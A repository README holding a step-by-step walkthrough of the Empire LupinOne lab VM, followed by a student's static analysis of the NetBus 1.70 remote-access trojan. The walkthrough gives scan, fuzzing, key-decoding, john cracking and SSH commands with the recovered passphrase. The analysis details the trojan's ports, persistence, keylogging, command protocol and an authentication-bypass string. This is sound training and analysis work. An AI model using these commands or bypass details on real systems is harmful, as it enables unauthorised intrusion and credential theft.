

##  Repository Structure

```
Empire-LupinOne-Pentest/
├── README.md                     # this file  Project overview & structure
├── Empire-LupinOne-Report.pdf    # full penetration test report (PDF)
└── images/                       # screenshots referenced by the report
    ├── 01-target-vm-network.png      # target VM host-only network config
    ├── 02-kali-vm-network.png        # attacker VM host-only network config
    ├── 04-netdiscover.png            # host discovery
    ├── 05-nmap-quick.png             # initial nmap scan (22, 80)
    ├── 06-nmap-full.png              # full nmap -sV -sS -sC
    ├── 07-web-root.png               # web root page
    ├── 08-robots-txt.png             # robots.txt (Disallow /~myfiles)
    ├── 09-myfiles-404.png            # /~myfiles decoy (404)
    ├── 10-ffuf-dirs-setup.png        # ffuf directory fuzzing
    ├── 11-ffuf-secret-found.png      # /~secret/ discovered
    ├── 12-secret-directory.png       # note inside /~secret/
    ├── 13-ffuf-files-setup.png       # ffuf hidden-file fuzzing
    ├── 14-ffuf-mysecret-found.png    # .mysecret.txt discovered
    ├── 15-base58-blob.png            # encoded blob
    ├── 16-base58-decoded-key.png     # Base58 → OpenSSH key
    ├── 17-ssh2john.png               # ssh2john conversion
    ├── 19-john-permission.png        # john re-run with sudo
    ├── 20-john-cracked.png           # passphrase cracked
    ├── 21-ssh-key-attempt.png        # SSH key login attempt
    ├── 22-ssh-success.png            # successful SSH login (icex64)
    └── 24-user-flag.png              # user.txt captured
```

--

---

## Target

| | |
|---|---|
| Host | `<target ip>` |
| OS | Debian 11 (Linux 5.10) |
| Difficulty | Medium |
| Services | `22/tcp` OpenSSH 8.4p1 · `80/tcp` Apache 2.4.48 |

---

##  Attack Chain at a Glance

```
netdiscover / nmap
        │  22 (ssh), 80 (http)
        ▼
robots.txt → /~myfiles (404 decoy)
        │
        ▼
ffuf  /~FUZZ           →  /~secret/  (301)
        │
        ▼
ffuf  /~secret/.FUZZ   →  .mysecret.txt  (hidden dot-file)
        │
        ▼
Base58 decode          →  OpenSSH private key (id_rsa)
        │
        ▼
ssh2john + john (fasttrack.txt)  →  passphrase: P@55w0rd!
        │
        ▼
chmod 600 + ssh -i id_rsa icex64@<target ip>   →  shell as icex64
        │
        ▼
      user.txt   captured
```

---

##  Key Takeaways

- **A private key was exposed over HTTP** — encoding (Base58) is not protection.
- **The passphrase was weak** (`fasttrack.txt`-crackable in ~1s).
- **`robots.txt` and naming conventions leaked structure**, and even a decoy narrowed the search.
- The compromise required *every* weak link — fixing any one breaks the chain.

---

##  Full Command Walkthrough

Every command used in the engagement, with inline comments. Replace `<target ip>`
with the machine's actual address on your lab network.

### 1 · Reconnaissance

```bash
# Discover live hosts on the local (host-only) segment via ARP.
# Reveals the target's IP without touching it noisily.
sudo netdiscover

# Quick default TCP scan — which ports are open?
# Result here: 22/tcp (ssh) and 80/tcp (http).
nmap <target ip>

# Deep scan of the two known ports:
#   -sS  SYN (stealth) scan
#   -sV  service/version detection (OpenSSH 8.4p1, Apache 2.4.48)
#   -sC  default NSE scripts (pulls http-robots.txt -> /~myfiles)
nmap -sV -sS -sC <target ip>
```

### 2 · Web Enumeration

```bash
# Read the robots.txt hinted at by nmap.
# It disallows /~myfiles ... which turns out to be a 404 decoy.
curl http://<target ip>/robots.txt

# The '~' prefix screams Apache userdir. Fuzz for real userdir names.
#   -w   wordlist
#   -c   colourised output
#   -ic  ignore wordlist comment lines
#   -fc 403   filter out 403 responses (noise)
# -> finds "secret" (HTTP 301), i.e. /~secret/
ffuf -u http://<target ip>/~FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403

# View the /~secret/ page — it contains a note from "icex64" saying an
# SSH private key is HIDDEN in this directory and the passphrase is
# crackable with "fasttrack". Two big hints in one message.
curl http://<target ip>/~secret/

# Fuzz again, this time for HIDDEN files (leading dot) inside /~secret/:
#   -e .txt,.html   also try these extensions on each word
# -> finds .mysecret.txt (HTTP 200, size 4689)
ffuf -u http://<target ip>/~secret/.FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403 \
     -e .txt,.html
```

### 3 · Credential Access (recover & crack the SSH key)

```bash
# Grab the hidden file. It's ONE long high-entropy line — an encoded blob,
# not a raw key. Character set (no 0/O/I/l) => Base58.
curl http://<target ip>/~secret/.mysecret.txt

# Base58-decode the blob to recover the OpenSSH private key.
# (Done via an online Base58 decoder, or the CLI below.)
# Save the decoded output as id_rsa.
curl -s http://<target ip>/~secret/.mysecret.txt | base58 -d > id_rsa
#   ^ if the 'base58' tool isn't installed:  pip install base58   (or use an online decoder)

# The key is passphrase-protected. Convert it to a John-crackable hash.
ssh2john id_rsa > hash.txt

# Crack the passphrase using the author-hinted 'fasttrack' wordlist.
# (First run without sudo may hit "Permission denied" on the wordlist path —
#  re-run with sudo as shown.)
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
#   -> recovered passphrase:  P@55w0rd!

# (Optional) redisplay the cracked passphrase later:
john --show hash.txt
```

### 4 · Initial Access (SSH foothold)

```bash
# SSH rejects world-readable private keys with "bad permissions".
# Lock the key down to owner-read/write only.
chmod 600 id_rsa

# Log in with the recovered key as icex64 (username came from the note).
# When prompted for the key passphrase, enter:  P@55w0rd!
ssh -i id_rsa icex64@<target ip>
```

### 5 · User Flag

```bash
# Now on the box as icex64 — read the user flag from the home directory.
cat user.txt
#   -> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

---

## Tools Used

`netdiscover` · `nmap` · `ffuf` · `ssh2john` · `john` · Base58 decoder · `ssh`

---

##  Findings Summary

| # | Finding | Severity |
|---|---|---|
| F-01 | SSH private key exposed on the public web server | Critical |
| F-02 | Weak passphrase on the SSH private key | High |
| F-03 | Sensitive content hidden by obscurity only | Medium |
| F-04 | Information disclosure via robots.txt / naming | Low |
| F-05 | Verbose service / version banners | Informational |

---

##  part 2
# Technical Malware Analysis Report
## NetBus 1.70 Remote Access Trojan Toolkit

**Analyst:** Kenil
**Programme:** M.Sc. Cyber Security
**Report date:** 23 July 2026
**Classification:** Coursework — contains live malware indicators
**Analysis type:** Static (structural, import, resource, string, disassembly)
**Samples executed:** None

---

## Handling notice

`patch.exe` is a functional remote-access backdoor. It must never be executed on a real,
networked, or production machine. All work documented here was performed statically in an
isolated Linux sandbox where Windows PE binaries cannot execute deliberate defence in depth.
Binaries must not be committed to public source control; publish hashes and reports only.

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Scope and methodology](#2-scope-and-methodology)
3. [Sample inventory](#3-sample-inventory)
4. [Part 1 GRAFFITI.exe](#4-part-1--graffitiexe)
5. [Part 2 patch.exe (server)](#5-part-2--patchexe-the-backdoor)
6. [Part 2 NetBus.exe (client)](#6-part-2--netbusexe-the-operator-console)
7. [Comparative analysis](#7-comparative-analysis-client-vs-server)
8. [Indicators of compromise](#8-indicators-of-compromise)
9. [Detection engineering](#9-detection-engineering)
10. [Behavioural analysis plan](#10-behavioural-analysis-plan)
11. [Remediation](#11-remediation)
12. [Analytical narrative](#12-analytical-narrative--how-the-conclusion-changed)
13. [Limitations](#13-limitations)
14. [Appendices](#14-appendices)

---

# 1. Executive summary

The supplied sample set is a complete **NetBus 1.70** remote-access trojan toolkit: the server
backdoor (`patch.exe`), the operator console (`NetBus.exe`), the author's manual (`NetBus.rtf`),
and the client's saved-state files (`Hosts.txt`, `Memo.txt`). A third binary, `GRAFFITI.exe`,
was initially suspected of being the delivery vehicle and was proven **benign**.

### Principal findings

| # | Finding | Significance |
|---|---|---|
| 1 | `patch.exe` operates **four** independent socket channels, not one | Architecture is more complex than documented |
| 2 | **TCP 12347 is a dedicated screen-capture channel** (`ScreenSock`) | Undocumented in the manual; a firewall rule derived from documentation alone leaves it open |
| 3 | Screen captures are **JPEG-compressed** before transmission | Explains bandwidth viability in 1998; gives a payload fingerprint |
| 4 | Server embeds an **SMTP client** that emails the operator on infection, retrying every 60 s | Active outbound exfil channel, undocumented |
| 5 | A `TFileIterator` is pre-configured to **recursively enumerate the entire `C:` drive** | Full-filesystem reconnaissance is a built-in default |
| 6 | Persistence via `HKLM\...\CurrentVersion\Run`, confirmed at instruction level | Precise remediation target |
| 7 | Process hiding via `RegisterServiceProcess` | Win9x-only; will not reproduce on modern Windows |
| 8 | Mutex `NBMutex` | High-confidence live-infection indicator |
| 9 | Neither binary is packed or obfuscated | Complete capability recovery by static analysis alone |
| 10 | `GRAFFITI.exe` is a benign American Greetings e-card | Corrects the initial hypothesis |

### Verdicts

| Sample | Classification |
|---|---|
| `patch.exe` | **MALICIOUS** — Backdoor / RAT server (`Backdoor.Win32.NetBus`) |
| `NetBus.exe` | **HACKTOOL** — RAT operator console |
| `GRAFFITI.exe` | **BENIGN** — Macromedia Director greeting card |

---

# 2. Scope and methodology

## 2.1 Analysis environment

| Component | Detail |
|---|---|
| Host | Isolated Linux sandbox, no outbound network to sample-controlled infrastructure |
| Execution | **None** — Windows PEs cannot run on the analysis host |
| Precaution | Execute permission stripped from all samples on extraction |
| Tooling | `file`, `md5sum`/`sha1sum`/`sha256sum`, `strings`, `od`, `unzip`, Python 3 + `pefile`, `capstone`, custom Delphi DFM decoder |

## 2.2 Analytical procedure

1. **Identification**  magic-byte typing, size, and MD5/SHA-1/SHA-256 for threat-intel
   correlation and evidential integrity.
2. **Structural analysis**  PE header parsing, section table enumeration with characteristics
   flags, per-section Shannon entropy to test for packing, and overlay detection by comparing
   the end of the last section against file size.
3. **Compiler identification** section naming conventions and linker version to establish the
   toolchain, which in turn determines which analysis techniques will be productive.
4. **Import analysis** full IAT enumeration, then classification of every API by capability
   class (network, persistence, keylogging, screen capture, execution, file operations, stealth).
5. **Resource analysis** extraction of `RT_RCDATA` (Delphi form definitions), `RT_STRING`
   (runtime message tables), and resource-type enumeration.
6. **Form reconstruction** a purpose-written binary DFM decoder to recover compiled component
   properties as readable text. This proved to be the single highest-value technique.
7. **String analysis** ASCII and UTF-16LE sweeps with contextual verification of every hit.
8. **Disassembly** x86 disassembly with import-thunk resolution to locate exact call sites for
   security-relevant APIs.
9. **Payload carving** manifest-driven offset extraction with signature validation.
10. **Cross-binary correlation** comparing client and server to establish roles empirically.

## 2.3 A note on method

The decisive technique in this analysis was **resource-level form reconstruction**, not string
searching. The listening ports are not stored as strings anywhere in `patch.exe`; a naive
`strings | grep 12345` returns only Delphi's `0123456789ABCDEF` hexadecimal conversion table.
The ports exist as `int16` property values inside compiled Delphi form data, and are only
recoverable by parsing that structure. This is the central methodological lesson of the report:
**match the technique to the toolchain.**

---

# 3. Sample inventory

## 3.1 Overview

| File | Size (bytes) | Type | Part | Verdict |
|---|---:|---|:---:|---|
| `patch.exe` | 494,592 | PE32 GUI i386 | 2 | **MALICIOUS** |
| `NetBus.exe` | 599,552 | PE32 GUI i386 | 2 | **HACKTOOL** |
| `GRAFFITI.exe` | 1,306,241 | PE32 GUI i386 + ZIP overlay | 1 | **BENIGN** |
| `NetBus.rtf` | 22,729 | Rich Text Format | 2 | Documentation |
| `Hosts.txt` | 0 | Empty | 2 | Client artefact |
| `Memo.txt` | 0 | Empty | 2 | Client artefact |

## 3.2 Cryptographic identification

```
patch.exe
  MD5     3542b56a5f9ac8a8c34eb9db6e2f4d00
  SHA-1   514559fc4d81b8e6ba8b68f629f5fbd1c6a7967e
  SHA-256 73a62d6593e3c70b60455299b793bb18d31eddd5f15d04442932c1d3ccb7eb0c

NetBus.exe
  MD5     067a8e2d5ccfe6eeed1fedfa5d223107
  SHA-1   fa60dbc10d96ea390e5679deb360ced14ed8a9d6
  SHA-256 848e12d94d467f2add01403a730e0b4762f594baf70c425fe86b3917c3f0b00b

GRAFFITI.exe
  MD5     037356668c6da7e6a0fcc305db97e6ff
  SHA-1   6d021798a3f4fc2406cbd3a02d1e8363ce62ed31
  SHA-256 09c00ae65e75bc01cd018a27d718d39a4e9237bda8cbaf1fb37b1f251910e6e1

card.lng          (carved from GRAFFITI.exe)
  MD5     a3ec3bd60ddf969debb930225256a71d
  SHA-256 6ec98e5d01a4dbc09d7b56b705cc172a9dbaa8e547bed243b7428a73a87ebce5

fileio.dll        MD5 9f179cdc8d4c52c1b40514a53a1cc534
GREETING.EXE      MD5 15c00aad1aa877239506355b0657dde7
LINGO.INI         MD5 9b538f26347a27c1f9ae3a7f2ab31744
```

## 3.3 Note on the empty client artefacts

`Hosts.txt` (saved target list) and `Memo.txt` (operator notes) are **both zero bytes**.
Forensically this is a meaningful negative result: the collection demonstrates *possession* of
the toolkit, but preserves no record of targets. An investigator should report this explicitly
rather than omitting it — absence of evidence is itself evidence here, and it materially affects
the interpretation of the collection.

---

# 4. Part 1 `GRAFFITI.exe`

## 4.1 Summary

A self-extracting multimedia greeting card. **Benign.** It was analysed first because it was the
initially-suspected infection vector; the analysis disproved that hypothesis.

## 4.2 Container structure

`file` reports "Zip archive, with extra data prepended", but the first two bytes are `4D 5A`
(`MZ`) a valid PE. The file is therefore a **PE stub with an appended ZIP overlay**: the
classic self-extractor layout.

```
Offset      Content
0x000000    MZ / PE32 header
            ├─ 4 sections, none high-entropy → NOT packed
            └─ last section ends at 176,128 (0x2B000)
0x02B008    ZIP overlay begins (1,130,113 bytes)
            └─ single member: card.lng
0x13EFEB    End of Central Directory
```

### Section entropy (packing test)

| Section | Entropy | Interpretation |
|---|---:|---|
| `.text` | 6.59 | Normal compiled code |
| `.rdata` | 4.58 | Normal read-only data |
| `.data` | 4.68 | Normal initialised data |
| `.rsrc` | 3.62 | Normal resources |

No section exceeds 7.0. The stub is neither packed nor crypted.

## 4.3 The `grafPrf` container format

`card.lng` is not a language file. Its header is a proprietary container with the ASCII magic
`grafPrf`, followed by a newline-delimited manifest, a greeting message, then the member files
stored **raw and concatenated**:

```
Offset  Content
0       "grafPrf\n"                  magic
8       "130\n"                      version / count field
12      "fileio.dll\n12832\n"        member 1: name, size
29      "GREETING.EXE\n1531622\n"    member 2: name, size
50      "LINGO.INI\n67\n"            member 3: name, size
63      "d\n67\n"                    trailing field
68      "end.end\r\n"                manifest terminator
77      "126\r" + greeting text      126-byte message
207     <fileio.dll data>            12,832 bytes
13039   <GREETING.EXE data>          1,531,622 bytes
1544661 <LINGO.INI data>             67 bytes
1544728 EOF                          ← exact match
```

### The arithmetic that settles the case

```
207 + 12,832 + 1,531,622 + 67 = 1,544,728 bytes = exact file size of card.lng
```

Every byte of the container is accounted for by three identifiable files. **There is no
unallocated space in which a payload could hide.**

## 4.4 Carved components

| File | Size | Format | Identity |
|---|---:|---|---|
| `fileio.dll` | 12,832 | 16-bit NE | Macromedia Director **FileIO Xtra** |
| `GREETING.EXE` | 1,531,622 | 16-bit NE | Director **4.0.4 projector** — the card itself |
| `LINGO.INI` | 67 | ASCII | Director startup script |

`LINGO.INI` in full:

```lingo
--
on startup
  openxlib (the pathname & "fileio")
end startup
```

Benign boilerplate that loads the FileIO Xtra. No drop, execute, or network logic.

### Attribution

`GREETING.EXE` contains its own build path:

```
D:\AG\AGONLINE\AG#3\GRAFFITI.DIR    +    XFIR (Director movie signature)
```

`AG` / `AGONLINE` = **American Greetings Online**. Supporting strings include
*"Macromedia Director 4.0.4"*, *"Copyright 1985-1994 Macromedia"*, *"Projector Application"*,
and *"MacroMix sound mixer 4.0.4"*. Two additional embedded NE modules resolve by module name to
**`DIB`** (device-independent bitmap graphics) and **`MACROMIX`** (audio) — standard runtime
components bundled by every Director 4 projector, not hidden payloads.

## 4.5 False-positive analysis

Each signal that originally suggested malice was tested and failed:

| Signal | Test applied | Result |
|---|---|---|
| `12345` string | Context extraction around every hit | `123456789` adjacent to "bigGraffiti"/"game", plus a UTF-16 `0-9` glyph list. **Not a port.** |
| `\Run`, `SHELL`, `SYSTEM`, `delete` | Context and cross-reference | Lingo keyword table and font/system references present in every Director projector. **Not operations.** |
| Extra `MZ` headers | NE/PE header validation | Resolve to `DIB` and `MACROMIX` runtime DLLs. **Standard components.** |
| `PK` signatures inside the PE | ZIP local-header field parsing | Impossible field values (name length 24,224). **Coincidental byte sequences in x86 code.** |
| `URL` matches | Context extraction | Case-insensitive substrings inside unrelated words. **No URLs.** |
| Dropper-like imports | Behavioural reasoning | Consistent with a self-extracting *player*: unpack, write settings, launch the card. |

A dangerous-verb sweep of the Director movie region returned **zero** hits for `shellExecute`,
`winExec`, `command.com`, `cmd.exe`, `regedit`, `.reg`, `system32`, `createFile`, `writeString`,
`gotoNetPage`, `downloadNetThing`, or `netDone`.

## 4.6 Verdict

**BENIGN.** The archive is fully accounted for by clean Director components; the stub imports no
networking APIs and therefore cannot download a payload; and no NetBus artefact
(`netbus`, `patch.exe`, `KeyHook`, `ServerPwd`, a `Run` path) appears anywhere in the file.

---

# 5. Part 2 — `patch.exe` (the backdoor)

## 5.1 PE characteristics

| Property | Value |
|---|---|
| Format | PE32 executable, GUI subsystem, Intel i386 |
| Machine | `0x014C` |
| Sections | 8 |
| Entry point (RVA) | `0x0005A274` |
| Image base | `0x00400000` |
| Linker version | 2.25 |
| Compile timestamp | 1992-06-19 22:22:17 UTC (**see §5.2**) |
| Version resource | **None** |
| Overall entropy | 6.501 |

## 5.2 Compiler identification and the timestamp trap

The section names `CODE`, `DATA`, `BSS`, `.idata`, `.tls`, `.rdata`, `.reloc`, `.rsrc` together
with linker version 2.25 identify **Borland Delphi**. Both binaries report an identical compile
timestamp of **1992-06-19 22:22:17 UTC** — which predates Win32 Delphi entirely.

> **This is not a real build date.** Borland's linker writes a fixed value into the PE header.
> It must not be used for timeline reconstruction, and its appearance in two unrelated-looking
> files is a compiler fingerprint rather than evidence of common authorship timing.

Identifying the compiler early was decisive: it is what prompted the DFM resource analysis in
§5.5, which recovered configuration data that string analysis could never have surfaced.

## 5.3 Section table

| Name | VirtAddr | VirtSize | RawPtr | RawSize | Entropy | Characteristics |
|---|---|---|---|---|---:|---|
| `CODE` | `0x00001000` | `0x000592E0` | `0x00000400` | `0x00059400` | 6.521 | CODE, EXEC, READ |
| `DATA` | `0x0005B000` | `0x00001648` | `0x00059800` | `0x00001800` | 4.608 | INIT_DATA, READ, WRITE |
| `BSS` | `0x0005D000` | `0x000009CD` | `0x0005B000` | `0x00000000` | 0.000 | READ, WRITE |
| `.idata` | `0x0005E000` | `0x00002558` | `0x0005B000` | `0x00002600` | 5.022 | INIT_DATA, READ, WRITE |
| `.tls` | `0x00061000` | `0x0000000C` | `0x0005D600` | `0x00000000` | 0.000 | READ, WRITE |
| `.rdata` | `0x00062000` | `0x00000018` | `0x0005D600` | `0x00000200` | 0.205 | INIT_DATA, READ |
| `.reloc` | `0x00063000` | `0x00005044` | `0x0005D800` | `0x00005200` | 6.645 | INIT_DATA, READ |
| `.rsrc` | `0x00069000` | `0x00016200` | `0x00062A00` | `0x00016200` | 5.766 | INIT_DATA, READ |

**No section exceeds entropy 7.0.** The binary is not packed, not crypted, and not obfuscated.
This single fact is why static analysis alone recovers the complete capability set — a
characteristic of the era, and a sharp contrast with modern malware.

## 5.4 Import analysis

Fourteen import descriptors across nine DLLs. Classified by capability:

### Network / C2 — `wsock32.dll` (25 imports)

```
WSAStartup      WSACleanup      WSAAsyncSelect  WSAGetLastError  __WSAFDIsSet
socket          bind            listen          accept           connect
send            recv            select          closesocket      ioctlsocket
gethostbyname   htons           inet_addr       inet_ntoa
```

> **`bind` + `listen` + `accept` is the definitive backdoor signature.** These three APIs mean
> the process opens a listening socket and accepts inbound connections. A normal application
> that merely talks to a server needs only `connect`.

### Persistence — `advapi32.dll`

```
RegCreateKeyExA   RegSetValueExA   RegOpenKeyExA
RegQueryValueExA  RegDeleteValueA  RegCloseKey
```

The presence of `RegDeleteValueA` alongside the write APIs indicates **uninstall support** — a
deliberate design feature, matching the documented `/remove` switch.

### Keylogging and input injection — `user32.dll`

```
SetWindowsHookExA   GetKeyState        GetKeyboardLayout   GetKeyboardLayoutList
GetKeyboardType     MapVirtualKeyA     keybd_event         mouse_event
SetCursorPos
```

`SetWindowsHookExA` installs the keyboard hook. `keybd_event`, `mouse_event` and `SetCursorPos`
inject **synthetic input** — the operator can drive the victim's mouse and keyboard directly.

### Screen capture — `gdi32.dll`

```
GetDC   GetDCEx   GetWindowDC   CreateCompatibleDC
CreateCompatibleBitmap   BitBlt   GetDIBits
```

The canonical screen-capture chain: acquire a device context, create a compatible bitmap,
`BitBlt` the screen into it, extract pixels with `GetDIBits`.

### Process control and execution — `kernel32.dll` / `shell32.dll`

```
CreateProcessA   OpenProcess   OpenProcessToken   TerminateProcess
ExitWindowsEx    ShellExecuteA
```

Arbitrary program execution, arbitrary process termination, and forced shutdown/logoff.

### File operations

```
CreateFileA  ReadFile   WriteFile   CopyFileA   DeleteFileA
FindFirstFileA  FindNextFileA  CreateFileMappingA
GetWindowsDirectoryA  GetTempPathA  GetModuleFileNameA
```

`GetModuleFileNameA` + `GetWindowsDirectoryA` + `CopyFileA` is the **self-installation triad**:
determine own path, determine the Windows directory, copy self there.

### Stealth and survival

```
RegisterServiceProcess   CreateMutexA   FindWindowA   ShowWindow   SetWindowLongA
```

### Multimedia — `winmm.dll` (15 imports)

```
mciSendStringA   mciSendCommandA   waveOutGetVolume   waveOutSetVolume
waveOutGetNumDevs   waveOutGetDevCapsA
```

Supports the CD-tray and audio "prank" functions, and volume manipulation.

## 5.5 Form reconstruction — the architectural blueprint

The highest-value artefact in this analysis. Delphi compiles form definitions into `RT_RCDATA`
resources in a binary format (`TPF0`). Decoding `TMAINFORM2` from `patch.exe` yields the
server's complete component configuration:

```pascal
object MainForm2: TMainForm2
  Left = 192   Top = 107   Width = 302   Height = 171
  OnCreate = FormCreate
  OnDestroy = FormDestroy

  object MediaPlayer1: TMediaPlayer
    Visible = False                          { hidden — prank audio/CD }
  end

  object ServerSock: TServerSocket           { ── CHANNEL 1: COMMAND ── }
    Active = False
    Port = 12345
    ServerType = stNonBlocking
    OnClientConnect    = ServerSockClientConnect
    OnClientDisconnect = ServerSockClientDisconnect
    OnClientRead       = ServerSockClientRead
    OnClientError      = ServerSockClientError
  end

  object ServerSock2: TServerSocket          { ── CHANNEL 2: BULK DATA ── }
    Active = False
    Port = 12346
    ServerType = stThreadBlocking
    OnGetThread   = ServerSock2GetThread
    OnClientError = ServerSock2ClientError
  end

  object ScreenSock: TServerSocket           { ── CHANNEL 3: SCREEN CAPTURE ── }
    Active = False
    Port = 12347
    ServerType = stThreadBlocking
    OnGetThread   = ScreenSockGetThread
    OnClientError = ScreenSockClientError
  end

  object PortRedirSvr: TServerSocket         { ── CHANNEL 4a: PIVOT (listener) ── }
    Active = False
    Port = 0                                 { assigned at runtime }
    ServerType = stThreadBlocking
    OnGetThread = PortRedirSvrGetThread
    ...
  end

  object PortRedirClient: TClientSocket      { ── CHANNEL 4b: PIVOT (outbound) ── }
    Active = False
    ClientType = ctBlocking
    Port = 0
    ...
  end

  object AppRedirSvr: TServerSocket          { ── CHANNEL 5: APP I/O REDIRECT ── }
    Active = False
    Port = 0
    ServerType = stThreadBlocking
    OnGetThread = AppRedirSvrGetThread
  end

  object FileIterator1: TFileIterator        { ── FILESYSTEM RECONNAISSANCE ── }
    Options    = [fiPath, fiDetails, fiRecurseFolders]
    RootFolder = 'C:'
    OnAddFile      = FileIterator1AddFile
    OnNewDirectory = FileIterator1NewDirectory
    OnTerminate    = FileIterator1Terminate
  end

  object DriveList1: TDriveList        { enumerate available drives }
  object VolumeControl1: TVolumeControl { Interval = 0 }

  object DelayTimer:  TTimer  { Enabled = False }
  object RecordTimer: TTimer  { Enabled = False — capture/recording cadence }
  object MailTimer:   TTimer  { Enabled = False; Interval = 60000 }
end
```

### What this reveals that nothing else did

| Discovery | Detail | Why it matters |
|---|---|---|
| **Four+ socket channels** | `ServerSock`, `ServerSock2`, `ScreenSock`, plus redirect sockets | The architecture is multi-channel; blocking one port does not neutralise the backdoor |
| **Purpose of TCP 12347** | `ScreenSock` — dedicated screen-capture streaming | The manual never documents this port *or* its function |
| **Separation of concerns** | 12345 non-blocking (commands), 12346/12347 thread-blocking (bulk transfer) | Screen and file data stream on separate threads so the command channel stays responsive |
| **`RootFolder = 'C:'` with `fiRecurseFolders`** | Recursive enumeration of the entire system drive | Full-filesystem reconnaissance is a pre-configured default, not an operator action |
| **`MailTimer.Interval = 60000`** | 60-second cadence | The infection notification **retries every minute** until it succeeds |
| **Dynamic ports (`Port = 0`)** | Redirect sockets bind at runtime | Pivot channels use ephemeral ports and cannot be blocked by a static port rule |

## 5.6 Network architecture

```
                    ┌──────────────────────────────┐
   operator ───────►│ TCP 12345  ServerSock        │  commands  (non-blocking)
                    ├──────────────────────────────┤
   operator ───────►│ TCP 12346  ServerSock2       │  bulk data (thread-blocking)
                    ├──────────────────────────────┤
   operator ───────►│ TCP 12347  ScreenSock        │  screen    (thread-blocking, JPEG)
                    ├──────────────────────────────┤
   operator ◄──────►│ TCP dyn.   PortRedirSvr      │  pivot / tunnel
                    │            PortRedirClient   │
                    ├──────────────────────────────┤
   operator ◄──────►│ TCP dyn.   AppRedirSvr       │  application I/O redirection
                    └──────────────┬───────────────┘
                                   │
                    TCP 25 ────────▼  SMTP: "NetBus server is up and running"
                                      (MailTimer, retry every 60 s)
```

**Defensive implication:** a rule blocking only TCP 12345 — the port most commonly cited for
NetBus — leaves the data channel, the screen channel, the dynamically-bound pivot channels, and
the SMTP notification path fully operational.

## 5.7 Persistence

Confirmed at three independent levels of evidence:

1. **String:** `\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` present in `CODE`.
2. **Imports:** `RegCreateKeyExA`, `RegSetValueExA`, `RegDeleteValueA`.
3. **Disassembly:** call sites clustered in a single routine region —

```
0x0043F82B   call RegCreateKeyExA     ; open/create the Run key
0x0043F8B2   call RegDeleteValueA     ; uninstall path (/remove)
0x0043F9DA   call RegSetValueExA      ; write the autorun value
```

All three calls fall within ~430 bytes of one another, confirming a single
install/uninstall routine rather than incidental registry use.

## 5.8 Self-installation

```
0x004557AB   call GetWindowsDirectoryA   ; resolve %WINDIR%
0x00455C9E   call CopyFileA              ; copy self into it
```

These two calls sit ~1.2 KB apart in the same routine, together with `GetModuleFileNameA`
(resolve own path). This is the self-installation sequence: the server copies itself into the
Windows directory so that the `Run` value points at a stable location independent of where the
victim originally executed it.

## 5.9 Stealth

| Mechanism | Evidence | Notes |
|---|---|---|
| Process hiding | `RegisterServiceProcess` | **Win9x only.** Registers the process as a service so it is omitted from the Ctrl+Alt+Del task list. Will not function on NT-family Windows. |
| Single instance | `CreateMutexA` @ `0x0043E652`, mutex name **`NBMutex`** | Prevents duplicate infections; also the single best live-infection indicator |
| Silent failure | String `Process is already active` | Second instance exits quietly |
| No version resource | Confirmed absent | Denies defenders trivial metadata attribution |
| Innocuous filename | `patch.exe` | Masquerades as a software update |

## 5.10 Keylogging

```
0x0042C5B0   call SetWindowsHookExA
```

Supporting artefacts: `KeyHook.dll`, `SetKeyHook`, `ClearKeyHook`, `MyKeyHook`, and the
registry path `System\CurrentControlSet\Control\Keyboard Layouts\%.8x`. The hook is implemented
in a **separate DLL** so it can be injected into other processes — the standard technique for
system-wide keystroke capture. The string `Login ID:` indicates credential-oriented capture.

## 5.11 Screen capture

The GDI import chain (§5.4) is confirmed by `RT_STRING` entries:

```
Cannot change the size of a JPEG image
JPEG error #%d
```

Screen captures are **JPEG-compressed before transmission** over `ScreenSock` (TCP 12347). In
1998, over dial-up, raw bitmaps would have been unusable; JPEG compression is what made remote
screen viewing practical. For a defender this is also a traffic fingerprint: JPEG magic bytes
(`FF D8 FF`) appearing in a TCP stream on port 12347.

## 5.12 SMTP infection notification

| Artefact | Value |
|---|---|
| Configuration fields | `MailTo`, `MailFrom`, `MailHost` |
| Threading | `TMailThread` |
| Protocol verbs | `mail from:`, `rcpt to:` (raw SMTP) |
| Message subject | `Subject: NetBus server is up and running` |
| Retry cadence | `MailTimer.Interval = 60000` (60 seconds) |

The server implements SMTP **directly**, without relying on a mail client on the host. When a
newly infected machine comes online it notifies the operator by email, retrying every minute.

This capability appears nowhere in the bundled manual. It is the clearest demonstration in this
report of why author documentation cannot substitute for analysis: an analyst who trusted the
manual would have missed both an outbound exfiltration channel and a whole listening port.

## 5.13 Command protocol

Command tokens recovered from **both** binaries, confirming a shared plaintext protocol of the
documented form `command;arg;arg`:

```
Password      GetInfo       GetApps       GetDisks      KillApp
StartApp      UploadFile    DownloadFile  DeleteFile    ShowImage
PlaySound     Msg           ClickOnKey    KeyClick      DisableKeys
SwapMouse     ExitWin       ServerPwd     RemoveServer  SendText
Play          Active        AppRedir      PortRedir
```

Supporting strings: `Clients connected to this host:`, `NetBus server is running on`,
`Access.txt` / `Access;` (operator IP allow-list), `NetBus 1.70`.

**The protocol is unencrypted.** Every command traverses the network in clear ASCII, which makes
network-based detection straightforward and reliable (§9.2).

## 5.14 Command-line switches

| Switch | Documented behaviour |
|---|---|
| `/noadd` | Run without installing persistence |
| `/remove` | Uninstall — remove persistence and exit |
| `/pass:xxx` | Set the server password |
| `/port:xxx` | Override the listening port |

Corroborating internal handlers: `RemoveServer`, `PatchDone`, `ServerPwd`.

## 5.15 Security weaknesses of the malware itself

Relevant to incident response, because they aid both attribution and recovery:

| Weakness | Consequence |
|---|---|
| Password stored **in cleartext** at `HKCU\Patch\Settings\ServerPwd` | Recoverable during forensics; identifies the operator's chosen key |
| No transport encryption | Full session reconstruction from a packet capture |
| Known authentication bypass (`Password;1;<any>`) | Third parties could hijack infected hosts — a compromised host may have had *multiple* uninvited controllers |
| Fixed default ports | Trivial network detection |
| Reference identifier | **CAN-1999-0660** |

---

# 6. Part 2 — `NetBus.exe` (the operator console)

## 6.1 PE characteristics

| Property | Value |
|---|---|
| Format | PE32 GUI, Intel i386, 8 sections |
| Compiler | Borland Delphi (linker 2.25) — identical toolchain to the server |
| Entry point (RVA) | `0x00067938` |
